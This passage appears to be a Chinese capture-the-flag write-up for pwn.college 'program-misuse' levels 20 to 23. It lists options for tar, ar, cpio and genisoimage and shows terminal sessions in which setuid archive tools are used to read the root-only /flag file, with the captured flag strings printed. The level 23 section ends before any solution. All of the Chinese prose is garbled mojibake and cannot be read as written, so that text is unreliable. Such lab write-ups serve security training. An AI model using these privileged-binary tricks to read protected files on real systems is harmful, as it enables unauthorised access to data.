<p>è¿™ä¸ªå‘½ä»¤ä¼šå°†åä¸º <code>archive.tar</code> çš„å½’æ¡£æ–‡ä»¶è§£å‹ç¼©åˆ°æŒ‡å®šçš„ç›®å½• <code>/path/to/directory/</code> ä¸­ã€‚</p>
<p>å½“ä½ åœ¨ä½¿ç”¨ <code>tar</code> å‘½ä»¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¤šä¸ªé€‰é¡¹æ¥æ§åˆ¶å…¶è¡Œä¸ºã€‚ä»¥ä¸‹æ˜¯å¯¹å¸¸ç”¨é€‰é¡¹çš„è§£é‡Šï¼š</p>
<ol>
<li>
<p><code>-c, --create</code>ï¼šåˆ›å»ºå½’æ¡£æ–‡ä»¶ã€‚è¿™ä¸ªé€‰é¡¹å‘Šè¯‰ <code>tar</code> å‘½ä»¤ä½ è¦åˆ›å»ºä¸€ä¸ªæ–°çš„å½’æ¡£æ–‡ä»¶ã€‚</p>
</li>
<li>
<p><code>-v, --verbose</code>ï¼šè¯¦ç»†æ¨¡å¼ã€‚å¯ç”¨è¯¦ç»†è¾“å‡ºï¼Œä¼šæ˜¾ç¤ºåˆ›å»ºæˆ–æå–çš„æ–‡ä»¶åˆ—è¡¨ã€‚</p>
</li>
<li>
<p><code>-f, --file=ARCHIVE</code>ï¼šæŒ‡å®šå½’æ¡£æ–‡ä»¶çš„åç§°ã€‚<code>ARCHIVE</code> æ˜¯è¦åˆ›å»ºçš„å½’æ¡£æ–‡ä»¶çš„åç§°ã€‚</p>
</li>
<li>
<p><code>-z, --gzip</code>ï¼šä½¿ç”¨ gzip å‹ç¼©ã€‚ä½¿ç”¨ gzip å‹ç¼©å½’æ¡£æ–‡ä»¶ã€‚åªæœ‰åœ¨åˆ›å»ºå½’æ¡£æ–‡ä»¶æ—¶æ‰ä¼šç”¨åˆ°ã€‚</p>
</li>
<li>
<p><code>-j, --bzip2</code>ï¼šä½¿ç”¨ bzip2 å‹ç¼©ã€‚ä½¿ç”¨ bzip2 å‹ç¼©å½’æ¡£æ–‡ä»¶ã€‚åªæœ‰åœ¨åˆ›å»ºå½’æ¡£æ–‡ä»¶æ—¶æ‰ä¼šç”¨åˆ°ã€‚</p>
</li>
<li>
<p><code>-t, --list</code>ï¼šåˆ—å‡ºå½’æ¡£æ–‡ä»¶ä¸­çš„å†…å®¹ã€‚è¿™ä¸ªé€‰é¡¹å‘Šè¯‰ <code>tar</code> å‘½ä»¤è¦åˆ—å‡ºå½’æ¡£æ–‡ä»¶ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•ã€‚</p>
</li>
<li>
<p><code>-x, --extract, --get</code>ï¼šæå–å½’æ¡£æ–‡ä»¶ã€‚è¿™ä¸ªé€‰é¡¹å‘Šè¯‰ <code>tar</code> å‘½ä»¤ä½ è¦æå–å½’æ¡£æ–‡ä»¶ä¸­çš„æ–‡ä»¶ã€‚</p>
</li>
<li>
<p><code>-C, --directory=DIR</code>ï¼šæŒ‡å®šæå–æ–‡ä»¶çš„ç›®å½•ã€‚<code>DIR</code> æ˜¯æå–æ–‡ä»¶æ—¶è¦å­˜æ”¾çš„ç›®æ ‡ç›®å½•ã€‚</p>
</li>
<li>
<p><code>-O</code> é€‰é¡¹ã€‚è¿™ä¸ªé€‰é¡¹å‘Šè¯‰ <code>tar</code> å‘½ä»¤å°†è§£å‹ç¼©çš„å†…å®¹å†™å…¥æ ‡å‡†è¾“å‡ºè€Œä¸æ˜¯æ–‡ä»¶</p>
</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level20:/challenge$ <span class="token function">tar</span> <span class="token parameter variable">-cvf</span> flag.tar <span class="token string">"/flag"</span>
tar: Removing leading `/' from member names
/flag
hacker@program-misuse~level20:/challenge$ <span class="token function">ls</span>
babysuid_level20  flag.tar
hacker@program-misuse~level20:/challenge$ <span class="token function">tar</span> <span class="token parameter variable">-xOf</span> flag.tar 
pwn.college<span class="token punctuation">&#123;</span>wg9J9bzxSwEV2tNZMG_zYwyiBFA.0lM2EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level21ar"><a class="markdownIt-Anchor" href="#level21ar"></a> level21(ar)</h3>
<p><code>ar</code></p>
<h4 id="è¯­æ³•"><a class="markdownIt-Anchor" href="#è¯­æ³•"></a> è¯­æ³•</h4>
<pre class="line-numbers language-none"><code class="language-none">ar[-dmpqrtx][cfosSuvV][a&lt;æˆå‘˜æ–‡ä»¶&gt;][b&lt;æˆå‘˜æ–‡ä»¶&gt;][i&lt;æˆå‘˜æ–‡ä»¶&gt;][å¤‡å­˜æ–‡ä»¶][æˆå‘˜æ–‡ä»¶]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="å‚æ•°"><a class="markdownIt-Anchor" href="#å‚æ•°"></a> <strong>å‚æ•°</strong>ï¼š</h5>
<h5 id="å¿…è¦å‚æ•°"><a class="markdownIt-Anchor" href="#å¿…è¦å‚æ•°"></a> <strong>å¿…è¦å‚æ•°</strong>ï¼š</h5>
<ul>
<li>-d ã€€åˆ é™¤å¤‡å­˜æ–‡ä»¶ä¸­çš„æˆå‘˜æ–‡ä»¶ã€‚</li>
<li>-m ã€€å˜æ›´æˆå‘˜æ–‡ä»¶åœ¨å¤‡å­˜æ–‡ä»¶ä¸­çš„æ¬¡åºã€‚</li>
<li>-p ã€€æ˜¾ç¤ºå¤‡å­˜æ–‡ä»¶ä¸­çš„æˆå‘˜æ–‡ä»¶å†…å®¹ã€‚</li>
<li>-q ã€€å°†æ–‡ä»¶é™„åŠ åœ¨å¤‡å­˜æ–‡ä»¶æœ«ç«¯ã€‚</li>
<li>-r ã€€å°†æ–‡ä»¶æ’å…¥å¤‡å­˜æ–‡ä»¶ä¸­ã€‚</li>
<li>-t ã€€æ˜¾ç¤ºå¤‡å­˜æ–‡ä»¶ä¸­æ‰€åŒ…å«çš„æ–‡ä»¶ã€‚</li>
<li>-x ã€€è‡ªå¤‡å­˜æ–‡ä»¶ä¸­å–å‡ºæˆå‘˜æ–‡ä»¶ã€‚</li>
</ul>
<h5 id="é€‰é¡¹å‚æ•°"><a class="markdownIt-Anchor" href="#é€‰é¡¹å‚æ•°"></a> <strong>é€‰é¡¹å‚æ•°</strong>ï¼š</h5>
<ul>
<li>a&lt;æˆå‘˜æ–‡ä»¶&gt; ã€€å°†æ–‡ä»¶æ’å…¥å¤‡å­˜æ–‡ä»¶ä¸­æŒ‡å®šçš„æˆå‘˜æ–‡ä»¶ä¹‹åã€‚</li>
<li>b&lt;æˆå‘˜æ–‡ä»¶&gt; ã€€å°†æ–‡ä»¶æ’å…¥å¤‡å­˜æ–‡ä»¶ä¸­æŒ‡å®šçš„æˆå‘˜æ–‡ä»¶ä¹‹å‰ã€‚</li>
<li>c ã€€å»ºç«‹å¤‡å­˜æ–‡ä»¶ã€‚</li>
<li>f ã€€ä¸ºé¿å…è¿‡é•¿çš„æ–‡ä»¶åä¸å…¼å®¹äºå…¶ä»–ç³»ç»Ÿçš„aræŒ‡ä»¤æŒ‡ä»¤ï¼Œå› æ­¤å¯åˆ©ç”¨æ­¤å‚æ•°ï¼Œæˆªæ‰è¦æ”¾å…¥å¤‡å­˜æ–‡ä»¶ä¸­è¿‡é•¿çš„æˆå‘˜æ–‡ä»¶åç§°ã€‚</li>
<li>i&lt;æˆå‘˜æ–‡ä»¶&gt; ã€€å°†æ–‡ä»¶æ’å…¥å¤‡å­˜æ–‡ä»¶ä¸­æŒ‡å®šçš„æˆå‘˜æ–‡ä»¶ä¹‹å‰ã€‚</li>
<li>o ã€€ä¿ç•™å¤‡å­˜æ–‡ä»¶ä¸­æ–‡ä»¶çš„æ—¥æœŸã€‚</li>
<li>s ã€€è‹¥å¤‡å­˜æ–‡ä»¶ä¸­åŒ…å«äº†å¯¹è±¡æ¨¡å¼ï¼Œå¯åˆ©ç”¨æ­¤å‚æ•°å»ºç«‹å¤‡å­˜æ–‡ä»¶çš„ç¬¦å·è¡¨ã€‚</li>
<li>S ã€€ä¸äº§ç”Ÿç¬¦å·è¡¨ã€‚</li>
<li>u ã€€åªå°†æ—¥æœŸè¾ƒæ–°æ–‡ä»¶æ’å…¥å¤‡å­˜æ–‡ä»¶ä¸­ã€‚</li>
<li>v ã€€ç¨‹åºæ‰§è¡Œæ—¶æ˜¾ç¤ºè¯¦ç»†çš„ä¿¡æ¯ã€‚</li>
<li>V ã€€æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level21:/challenge$ ar <span class="token parameter variable">-r</span> flag.a /flag
ar: creating flag.a
hacker@program-misuse~level21:/challenge$ <span class="token function">ls</span>
babysuid_level21  flag.a
ssh-entrypoint: flag: <span class="token builtin class-name">command</span> not found
hacker@program-misuse~level21:/challenge$ ar xp flag.a
ar: two different operation options specified
hacker@program-misuse~level21:/challenge$ ar p flag.a
pwn.college<span class="token punctuation">&#123;</span>07JfL0D_QNkJfV4u1O8mk-FX5KA.01M2EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level22cpio"><a class="markdownIt-Anchor" href="#level22cpio"></a> level22(cpio)</h3>
<p>cpio æ˜¯ç”¨æ¥å»ºç«‹ï¼Œè¿˜åŸå¤‡ä»½æ¡£çš„å·¥å…·ç¨‹åºï¼Œå®ƒå¯ä»¥åŠ å…¥ï¼Œè§£å¼€ cpio æˆ– tar å¤‡ä»½æ¡£å†…çš„æ–‡ä»¶ã€‚</p>
<h4 id="è¯­æ³•-2"><a class="markdownIt-Anchor" href="#è¯­æ³•-2"></a> è¯­æ³•</h4>
<pre class="line-numbers language-none"><code class="language-none">cpio [-0aABckLovV][-C &lt;è¾“å…¥&#x2F;è¾“å‡ºå¤§å°&gt;][-F &lt;å¤‡ä»½æ¡£&gt;][-H &lt;å¤‡ä»½æ ¼å¼&gt;][-O &lt;å¤‡ä»½æ¡£&gt;][--block-size&#x3D;&lt;åŒºå—å¤§å°&gt;][--force-local][--help][--quiet][--version] æˆ– cpio [-bBcdfikmnrsStuvV][-C &lt;è¾“å…¥&#x2F;è¾“å‡ºå¤§å°&gt;][-E &lt;èŒƒæœ¬æ–‡ä»¶&gt;][-F &lt;å¤‡ä»½æ¡£&gt;][-H &lt;å¤‡ä»½æ ¼å¼&gt;][-I &lt;å¤‡ä»½æ¡£&gt;][-M &lt;å›ä¼ ä¿¡æ¯&gt;][-R &lt;æ‹¥æœ‰è€…&gt;&lt;:&#x2F;.&gt;&lt;æ‰€å±ç¾¤ç»„&gt;][--block-size&#x3D;&lt;åŒºå—å¤§å°&gt;][--force-local][--help][--no-absolute-filenames][--no-preserve-owner][--only-verify-crc][--quiet][--sparse][--version][èŒƒæœ¬æ ·å¼...] æˆ– cpio [-0adkiLmpuvV][-R &lt;æ‹¥æœ‰è€…&gt;&lt;:&#x2F;.&gt;&lt;æ‰€å±ç¾¤ç»„&gt;][--help][--no-preserve-owner][--quiet][--sparse][--version][ç›®çš„ç›®]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="å‚æ•°-2"><a class="markdownIt-Anchor" href="#å‚æ•°-2"></a> <strong>å‚æ•°</strong>ï¼š</h5>
<ul>
<li>-0æˆ–â€“null ã€€æ¥å—æ–°å¢åˆ—æ§åˆ¶å­—ç¬¦ï¼Œé€šå¸¸é…åˆfindæŒ‡ä»¤çš„&quot;-print0&quot;å‚æ•°ä½¿ç”¨ã€‚</li>
<li>-aæˆ–â€“reset-access-time ã€€é‡æ–°è®¾ç½®æ–‡ä»¶çš„å­˜å–æ—¶é—´ã€‚</li>
<li>-Aæˆ–â€“append ã€€é™„åŠ åˆ°å·²å­˜åœ¨çš„å¤‡ä»½æ¡£ä¸­ï¼Œä¸”è¿™ä¸ªå¤‡ä»½æ¡£å¿…é¡»å­˜æ”¾åœ¨ç£ç›˜ä¸Šï¼Œè€Œä¸èƒ½æ”¾ç½®äºç£å¸¦æœºé‡Œã€‚</li>
<li>-bæˆ–â€“swap ã€€æ­¤å‚æ•°çš„æ•ˆæœå’ŒåŒæ—¶æŒ‡å®š&quot;-sS&quot;å‚æ•°ç›¸åŒã€‚</li>
<li>-B ã€€å°†è¾“å…¥/è¾“å‡ºçš„åŒºå—å¤§å°æ”¹æˆ5210 Bytesã€‚</li>
<li>-c ã€€ä½¿ç”¨æ—§ASCIIå¤‡ä»½æ ¼å¼ã€‚</li>
<li>-C&lt;åŒºå—å¤§å°&gt;æˆ–â€“io-size=&lt;åŒºå—å¤§å°&gt; ã€€è®¾ç½®è¾“å…¥/è¾“å‡ºçš„åŒºå—å¤§å°ï¼Œå•ä½æ˜¯Byteã€‚</li>
<li>-dæˆ–â€“make-directories ã€€å¦‚æœ‰éœ€è¦cpioä¼šè‡ªè¡Œå»ºç«‹ç›®å½•ã€‚</li>
<li>-E&lt;èŒƒæœ¬æ–‡ä»¶&gt;æˆ–â€“pattern-file=&lt;èŒƒæœ¬æ–‡ä»¶&gt; ã€€æŒ‡å®šèŒƒæœ¬æ–‡ä»¶ï¼Œå…¶å†…å«æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªèŒƒæœ¬æ ·å¼ï¼Œè®©cpioè§£å¼€ç¬¦åˆèŒƒæœ¬æ¡ä»¶çš„æ–‡ä»¶ï¼Œæ ¼å¼ä¸ºæ¯åˆ—ä¸€ä¸ªèŒƒæœ¬æ ·å¼ã€‚</li>
<li>-fæˆ–â€“nonmatching ã€€è®©cpioè§£å¼€æ‰€æœ‰ä¸ç¬¦åˆèŒƒæœ¬æ¡ä»¶çš„æ–‡ä»¶ã€‚</li>
<li>-F&lt;å¤‡ä»½æ¡£&gt;æˆ–â€“file=&lt;å¤‡ä»½æ¡£&gt; ã€€æŒ‡å®šå¤‡ä»½æ¡£çš„åç§°ï¼Œç”¨æ¥å–ä»£æ ‡å‡†è¾“å…¥æˆ–è¾“å‡ºï¼Œä¹Ÿèƒ½å€Ÿæ­¤é€šè¿‡ç½‘ç»œä½¿ç”¨å¦ä¸€å°ä¸»æœºçš„ä¿å­˜è®¾å¤‡å­˜å–å¤‡ä»½æ¡£ã€‚</li>
<li>-H&lt;å¤‡ä»½æ ¼å¼&gt; ã€€æŒ‡å®šå¤‡ä»½æ—¶æ¬²ä½¿ç”¨çš„æ–‡ä»¶æ ¼å¼ã€‚</li>
<li>-iæˆ–â€“extract ã€€æ‰§è¡Œcopy-inæ¨¡å¼ï¼Œè¿˜åŸå¤‡ä»½æ¡£ã€‚</li>
<li>-l&lt;å¤‡ä»½æ¡£&gt; ã€€æŒ‡å®šå¤‡ä»½æ¡£çš„åç§°ï¼Œç”¨æ¥å–ä»£æ ‡å‡†è¾“å…¥ï¼Œä¹Ÿèƒ½å€Ÿæ­¤é€šè¿‡ç½‘ç»œä½¿ç”¨å¦ä¸€å°ä¸»æœºçš„ä¿å­˜è®¾å¤‡è¯»å–å¤‡ä»½æ¡£ã€‚</li>
<li>-k ã€€æ­¤å‚æ•°å°†å¿½ç•¥ä¸äºˆå¤„ç†ï¼Œä»…è´Ÿè´£è§£å†³cpioä¸åŒç‰ˆæœ¬é—´çš„å…¼å®¹æ€§é—®é¢˜ã€‚</li>
<li>-læˆ–â€“link ã€€ä»¥ç¡¬è¿æ¥çš„æ–¹å¼å–ä»£å¤åˆ¶æ–‡ä»¶ï¼Œå¯åœ¨copy-passæ¨¡å¼ä¸‹è¿ç”¨ã€‚</li>
<li>-Læˆ–â€“dereference ã€€ä¸å»ºç«‹ç¬¦å·è¿æ¥ï¼Œç›´æ¥å¤åˆ¶è¯¥è¿æ¥æ‰€æŒ‡å‘çš„åŸå§‹æ–‡ä»¶ã€‚</li>
<li>-mæˆ–preserve-modification-time ã€€ä¸å»æ›´æ¢æ–‡ä»¶çš„æ›´æ”¹æ—¶é—´ã€‚</li>
<li>-M&lt;å›ä¼ ä¿¡æ¯&gt;æˆ–â€“message=&lt;å›ä¼ ä¿¡æ¯&gt; ã€€è®¾ç½®æ›´æ¢ä¿å­˜åª’ä½“çš„ä¿¡æ¯ã€‚</li>
<li>-næˆ–â€“numeric-uid-gid ã€€ä½¿ç”¨&quot;-tv&quot;å‚æ•°åˆ—å‡ºå¤‡ä»½æ¡£çš„å†…å®¹æ—¶ï¼Œè‹¥å†åŠ ä¸Šå‚æ•°&quot;-n&quot;ï¼Œåˆ™ä¼šä»¥ç”¨æˆ·è¯†åˆ«ç å’Œç¾¤ç»„è¯†åˆ«ç æ›¿ä»£æ‹¥æœ‰è€…å’Œç¾¤ç»„åç§°åˆ—å‡ºæ–‡ä»¶æ¸…å•ã€‚</li>
<li>-oæˆ–â€“create ã€€æ‰§è¡Œcopy-outæ¨¡å¼ï¼Œå»ºç«‹å¤‡ä»½æ¡£ã€‚</li>
<li>-O&lt;å¤‡ä»½æ¡£&gt; ã€€æŒ‡å®šå¤‡ä»½æ¡£çš„åç§°ï¼Œç”¨æ¥å–ä»£æ ‡å‡†è¾“å‡ºï¼Œä¹Ÿèƒ½å€Ÿæ­¤é€šè¿‡ç½‘ç»œã€€ä½¿ç”¨å¦ä¸€å°ä¸»æœºçš„ä¿å­˜è®¾å¤‡å­˜æ”¾å¤‡ä»½æ¡£ã€‚</li>
<li>-pæˆ–â€“pass-through ã€€æ‰§è¡Œcopy-passæ¨¡å¼ï¼Œç•¥è¿‡å¤‡ä»½æ­¥éª¤ï¼Œç›´æ¥å°†æ–‡ä»¶å¤åˆ¶åˆ°ç›®çš„ç›®å½•ã€‚</li>
<li>-ræˆ–â€“rename ã€€å½“æœ‰æ–‡ä»¶åç§°éœ€è¦æ›´åŠ¨æ—¶ï¼Œé‡‡ç”¨äº’åŠ¨æ¨¡å¼ã€‚</li>
<li>-R&lt;æ‹¥æœ‰è€…&gt;&lt;:/.&gt;&lt;æ‰€å±ç¾¤ç»„&gt;æˆ–</li>
<li>----owner&lt;æ‹¥æœ‰è€…&gt;&lt;:/.&gt;&lt;æ‰€å±ç¾¤ç»„&gt; ã€€åœ¨copy-inæ¨¡å¼è¿˜åŸå¤‡ä»½æ¡£ï¼Œæˆ–copy-passæ¨¡å¼å¤åˆ¶æ–‡ä»¶æ—¶ï¼Œå¯æŒ‡å®šè¿™äº›å¤‡ä»½ï¼Œå¤åˆ¶çš„æ–‡ä»¶çš„æ‹¥æœ‰è€…ä¸æ‰€å±ç¾¤ç»„ã€‚</li>
<li>-sæˆ–â€“swap-bytes ã€€äº¤æ¢æ¯å¯¹å­—èŠ‚çš„å†…å®¹ã€‚</li>
<li>-Sæˆ–â€“swap-halfwords ã€€äº¤æ¢æ¯åŠä¸ªå­—èŠ‚çš„å†…å®¹ã€‚</li>
<li>-tæˆ–â€“list ã€€å°†è¾“å…¥çš„å†…å®¹å‘ˆç°å‡ºæ¥ã€‚</li>
<li>-uæˆ–â€“unconditional ã€€ç½®æ¢æ‰€æœ‰æ–‡ä»¶ï¼Œä¸è®ºæ—¥æœŸæ—¶é—´çš„æ–°æ—§ä¸å¦ï¼Œçš†ä¸äºˆè¯¢é—®è€Œç›´æ¥è¦†ç›–ã€‚</li>
<li>-væˆ–â€“verbose ã€€è¯¦ç»†æ˜¾ç¤ºæŒ‡ä»¤çš„æ‰§è¡Œè¿‡ç¨‹ã€‚</li>
<li>-Væˆ–â€“dot ã€€æ‰§è¡ŒæŒ‡ä»¤æ—¶ï¼Œåœ¨æ¯ä¸ªæ–‡ä»¶çš„æ‰§è¡Œç¨‹åºå‰é¢åŠ ä¸Š&quot;.&quot;å·</li>
<li>â€“block-size=&lt;åŒºå—å¤§å°&gt; ã€€è®¾ç½®è¾“å…¥/è¾“å‡ºçš„åŒºå—å¤§å°ï¼Œå‡å¦‚è®¾ç½®æ•°å€¼ä¸º5ï¼Œåˆ™åŒºå—å¤§å°ä¸º2500ï¼Œè‹¥è®¾ç½®æˆ10ï¼Œåˆ™åŒºå—å¤§å°ä¸º5120ï¼Œä¾æ¬¡ç±»æ¨ã€‚</li>
<li>â€“force-local ã€€å¼ºåˆ¶å°†å¤‡ä»½æ¡£å­˜æ”¾åœ¨æœ¬åœ°ä¸»æœºã€‚</li>
<li>â€“help ã€€åœ¨çº¿å¸®åŠ©ã€‚</li>
<li>â€“no-absolute-filenames ã€€ä½¿ç”¨ç›¸å¯¹è·¯å¾„å»ºç«‹æ–‡ä»¶åç§°ã€‚</li>
<li>â€“no-preserve-owner ã€€ä¸ä¿ç•™æ–‡ä»¶çš„æ‹¥æœ‰è€…ï¼Œè°è§£å¼€äº†å¤‡ä»½æ¡£ï¼Œé‚£äº›æ–‡ä»¶å°±å½’è°æ‰€æœ‰ã€‚</li>
<li>-only-verify-crc ã€€å½“å¤‡ä»½æ¡£é‡‡ç”¨CRCå¤‡ä»½æ ¼å¼æ—¶ï¼Œå¯ä½¿ç”¨è¿™é¡¹å‚æ•°æ£€æŸ¥å¤‡ä»½æ¡£å†…çš„æ¯ä¸ªæ–‡ä»¶æ˜¯å¦æ­£ç¡®æ— è¯¯ã€‚</li>
<li>â€“quiet ã€€ä¸æ˜¾ç¤ºå¤åˆ¶äº†å¤šå°‘åŒºå—ã€‚</li>
<li>â€“sparse ã€€å€˜è‹¥ä¸€ä¸ªæ–‡ä»¶å†…å«å¤§é‡çš„è¿ç»­0å­—èŠ‚ï¼Œåˆ™å°†æ­¤æ–‡ä»¶å­˜æˆç¨€ç–æ–‡ä»¶ã€‚</li>
<li>â€“version ã€€æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚</li>
</ul>
<h4 id="wp"><a class="markdownIt-Anchor" href="#wp"></a> wp</h4>
<p>è¿™ä¸ªé¢˜å¾ˆæœ‰ç‚¹éš¾åº¦</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level22:/$ cpio <span class="token parameter variable">-ov</span> <span class="token operator">&lt;</span> flag <span class="token operator">></span>flag.cpio
ssh-entrypoint: flag: Permission denied
hacker@program-misuse~level22:/$ <span class="token function">find</span> flag<span class="token operator">|</span>cpio <span class="token parameter variable">-ov</span> <span class="token operator">></span> flag.cpio
ssh-entrypoint: flag.cpio: Permission denied
hacker@program-misuse~level22:/$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¯ä»¥å‘ç°ï¼Œcpioæ²¡æœ‰å¯¹flagçš„è¯»æƒé™ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨findå‘½ä»¤è¿›è¡Œç»•è¿‡ï¼Œåˆ›å»ºflag.cpioåˆè¢«æ‹’ç»è¯´æ˜cpioä¹Ÿæ²¡æœ‰å†™æƒé™</p>
<p>åœ¨ç½‘ä¸Šæœäº†æœå…¶ä»–dlçš„æ€è·¯</p>
<p>å‘ç°é€šå¸¸æœ‰ä¸¤ä¸ªåœ°æ–¹å¯ä»¥å­˜æ”¾å‹ç¼©æ–‡ä»¶,æœ‰å†™å…¥æƒé™ã€‚</p>
<ol>
<li><code>/home/hacker: home directory.</code></li>
<li><code>/tmp: temp directory</code></li>
</ol>
<p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<code>/tmp</code>ç›®å½•ï¼Œ</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level22:/$ <span class="token function">find</span> flag<span class="token operator">|</span>cpio <span class="token parameter variable">-ov</span> <span class="token operator">></span> /tmp/flag.cpio
flag
<span class="token number">1</span> block<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>æ¥ç€ç”¨<code>cpio</code>è¯»å–å½’æ¡£çš„å†…å®¹</p>
<p>æˆ‘ä»¬éœ€è¦ä½¿ç”¨â€œ <code>-i</code> â€æ¥æå–å†…å®¹ï¼Œç„¶åæ‰“å°å‡ºåŒ…å«â€œ <code>--to-stdout</code> â€çš„å†…å®¹ï¼Œå…¶ä¸­â€œ <code>Extract files to standard output</code>â€æ˜¯æ‰“å°çš„å†…å®¹ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level22:/$ <span class="token builtin class-name">cd</span> /tmp
hacker@program-misuse~level22:/tmp$ cpio <span class="token parameter variable">-i</span> --to-stdout <span class="token operator">&lt;</span> flag.cpio
pwn.college<span class="token punctuation">&#123;</span>A0MclfD9AoelVA-b-hXVQ_byLYK.0FN2EDLzczN0UzW<span class="token punctuation">&#125;</span>
<span class="token number">1</span> block
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level23genisoimage"><a class="markdownIt-Anchor" href="#level23genisoimage"></a> level23(genisoimage)</h3>
<p><s>åˆæœ‰äº¿ç‚¹ç‚¹éš¾</s></p>
<p><code>genisoimage</code> å‘½ä»¤ç”¨äºåˆ›å»º ISO9660 å…‰ç›˜æ˜ åƒæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯åˆ›å»º ISO é•œåƒã€‚å®ƒæ˜¯åœ¨ Linux ä¸­ç”¨äºåˆ›å»ºå…‰ç›˜é•œåƒæ–‡ä»¶çš„å·¥å…·ä¹‹ä¸€ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ <code>genisoimage</code> å‘½ä»¤å‚æ•°ï¼š</p>
<ol>
<li>
<p><strong>-o filename</strong>ï¼šæŒ‡å®šè¾“å‡ºæ–‡ä»¶çš„åç§°ã€‚</p>
</li>
<li>
<p><strong>-r</strong>ï¼šå…è®¸åœ¨ ISO9660 æ–‡ä»¶ç³»ç»Ÿä¸­ä¿å­˜æ™®é€šç”¨æˆ·çš„æ–‡ä»¶æƒé™å’Œå±æ€§ã€‚</p>
</li>
<li>
<p><strong>-J</strong>ï¼šç”Ÿæˆé€‚ç”¨äº Windows çš„ Joliet æ‰©å±•æ ¼å¼çš„ ISO9660 æ–‡ä»¶ç³»ç»Ÿã€‚</p>
</li>
<li>
<p><strong>-joliet-long</strong>ï¼šå…è®¸ä½¿ç”¨é•¿æ–‡ä»¶åã€‚</p>
</li>
<li>
<p><strong>-l</strong>ï¼šå…è®¸ç”Ÿæˆ Rock Ridge æ‰©å±•æ ¼å¼çš„ ISO9660 æ–‡ä»¶ç³»ç»Ÿï¼Œä»¥æ”¯æŒ UNIX é£æ ¼çš„é•¿æ–‡ä»¶åå’Œæƒé™ã€‚</p>
</li>
<li>
<p><strong>-V volumeid</strong>ï¼šæŒ‡å®šå·æ ‡ï¼ˆå…‰ç›˜åç§°ï¼‰ã€‚</p>
</li>
<li>
<p><strong>-input-charset charset</strong>ï¼šæŒ‡å®šè¾“å…¥æ–‡ä»¶åçš„å­—ç¬¦é›†ã€‚</p>
</li>
<li>
<p><strong>-graft-points</strong>ï¼šå…è®¸å°†æ–‡ä»¶æˆ–ç›®å½•æ·»åŠ åˆ°æ˜ åƒçš„ç‰¹å®šè·¯å¾„ã€‚</p>
</li>
<li>
<p><strong>-R</strong>ï¼šä½¿ç”¨ Rock Ridge æ‰©å±•æ ¼å¼ç”Ÿæˆ ISO9660 æ–‡ä»¶ç³»ç»Ÿï¼Œä»¥æ”¯æŒ UNIX é£æ ¼çš„é•¿æ–‡ä»¶åå’Œæƒé™ã€‚</p>
</li>
<li>
<p><strong>-b boot_image</strong>ï¼šæŒ‡å®šç”¨äºå¼•å¯¼å…‰ç›˜çš„å¼•å¯¼æ˜ åƒæ–‡ä»¶ã€‚</p>
</li>
<li>
<p><strong>-no-emul-boot</strong>ï¼šç¦æ­¢æ¨¡æ‹Ÿè½¯ç›˜å¼•å¯¼ã€‚</p>
</li>
<li>
<p><strong>-boot-load-size load_sectors</strong>ï¼šæŒ‡å®šåŠ è½½åŒºåŸŸçš„å¤§å°ï¼ˆä»¥æ‰‡åŒºä¸ºå•ä½ï¼‰ã€‚</p>
</li>
<li>
<p><strong>-boot-info-table</strong>ï¼šåœ¨å¼•å¯¼æ˜ åƒä¸­åˆ›å»ºä¸€ä¸ªå¼•å¯¼ä¿¡æ¯è¡¨ã€‚</p>
</li>
<li>
<p><strong>-eltorito-boot boot_image</strong>ï¼šæŒ‡å®š El Torito å¼•å¯¼æ˜ åƒæ–‡ä»¶ã€‚</p>
</li>
<li>
<p><strong>-eltorito-catalog boot_catalog</strong>ï¼šæŒ‡å®š El Torito å¼•å¯¼ç›®å½•æ–‡ä»¶ã€‚</p>
</li>
<li>
<p><strong>-quiet</strong>ï¼šé™é»˜æ¨¡å¼ï¼Œå‡å°‘è¾“å‡ºã€‚</p>
</li>
</ol>
<p>å¯ä»¥åœ¨ç»ˆç«¯ä¸­è¿è¡Œ <code>man genisoimage</code> å‘½ä»¤æ¥æŸ¥çœ‹ <code>genisoimage</code> çš„æ‰‹å†Œé¡µã€‚</p>
<p>ä¸»è¦è¿™é‡Œå‘½ä»¤æ¯”è¾ƒå¤šï¼Œè¦ä¸€ä¸ªä¸€ä¸ªå°è¯•</p>
<p>è‡ªåŠ¨åŒ–å°è¯•å‘½ä»¤</p>
<p><code>genisoimage --help 2&gt;&amp;1 | grep FILE | awk '&#123;print $1&#125;'</code></p>
<p>è§£é‡Š</p>
<ul>
<li>genisoimage --help è·å–è¯¥ç¨‹åºçš„å¸®åŠ©ä¿¡æ¯</li>
<li>æœç´¢æœ‰å…³æ–‡ä»¶çš„å‘½ä»¤</li>
<li>awk â€˜{print($1)}â€™ æ‰“å°ç¬¬ä¸€åˆ—</li>
</ul>
